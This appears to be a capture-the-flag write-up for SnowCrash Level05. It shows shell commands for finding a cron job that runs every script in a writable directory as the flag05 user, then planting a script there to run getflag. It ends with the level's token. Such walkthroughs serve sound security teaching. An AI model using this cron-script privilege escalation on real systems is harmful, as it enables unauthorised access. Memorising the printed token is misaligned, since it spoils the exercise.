# Level05

`You have new mail.` in the shell once logged.

found a file
```shell
level05@SnowCrash:~$ find / -iname level05 2>/dev/null
/var/mail/level05
/rofs/var/mail/level05
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
So we have script run as `flag05` every 2 minutes which execute all script in `/opt/openarenaserver` directory and delete it.
Try to create a file in `/opt/openarenaserver/` and it gets deleted. So we can create a script which run getflag.

```shell
level05@SnowCrash:~$ which getflag
/bin/getflag
level05@SnowCrash:~$ echo "/bin/getflag > /tmp/level05.txt" > /opt/openarenaserver/flag.sh
level05@SnowCrash:~$ ls /opt/openarenaserver/
flag.sh
level05@SnowCrash:~$ cat /tmp/level05.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```